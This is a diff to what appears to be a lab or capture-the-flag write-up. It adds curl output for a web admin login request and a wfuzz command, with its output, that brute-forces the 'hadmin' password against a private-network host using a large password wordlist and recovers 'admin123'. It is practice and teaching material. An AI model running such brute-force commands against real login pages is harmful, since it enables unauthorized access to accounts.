@@ -478,7 +478,7 @@ Content-Length: 1 ←
 ```
 
 `curl "http://192.168.56.127/admin/ajax.php?action=login" -d "username=hadmin&password=TEST" -v`:
-```http
+```
 *   Trying 192.168.56.127:80...
 * Connected to 192.168.56.127 (192.168.56.127) port 80
 > POST /admin/ajax.php?action=login HTTP/1.1
@@ -501,12 +501,25 @@ Content-Length: 1 ←
 < Pragma: no-cache
 < 
 * Connection #0 to host 192.168.56.127 left intact
-3 ←    
+3 ←
 ```
 
 `wfuzz -u "http://192.168.56.127/admin/ajax.php?action=login" -d "username=hadmin&password=FUZZ" -z file,/usr/share/wordlists/seclists/SecLists-master/Passwords/xato-net-10-million-passwords.txt -c -v -t 30 --hs "3"`:
 ```
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
 
+Target: http://192.168.56.127/admin/ajax.php?action=login
+Total requests: 5189454
+
+====================================================================================================================================================
+ID           C.Time       Response   Lines      Word     Chars       Server                           Redirect                         Payload                                     
+====================================================================================================================================================
+
+000073831:   784.633s     200        0 L        1 W      1 Ch        nginx/1.18.0 (Ubuntu)                                             "admin123" ←
+
+[...]
 ```
 
 <🔄 Alternative Step.>
